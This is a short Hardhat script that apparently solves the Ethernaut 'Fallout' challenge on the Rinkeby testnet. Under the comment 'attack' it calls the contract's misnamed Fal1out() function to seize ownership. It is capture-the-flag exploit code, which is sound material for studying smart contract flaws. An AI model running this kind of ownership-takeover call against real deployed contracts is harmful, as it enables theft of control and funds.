// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";

async function main() {
  const provider = new ethers.providers.AlchemyProvider(
    "rinkeby",
    process.env.ALCHEMY_API_KEY as string
  );

  const signer = new ethers.Wallet(process.env.RINKEBY_PRIVATE_KEY as string, provider);


  // get fallout contract
  const fallout = await ethers.getContractAt("Fallout", "0xe45Ed0ec3D83F3e9368C7b3DEF3F97Af162F2Cd9");

  // attack
  const attackTx = await fallout.Fal1out()
  attackTx.wait(4)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
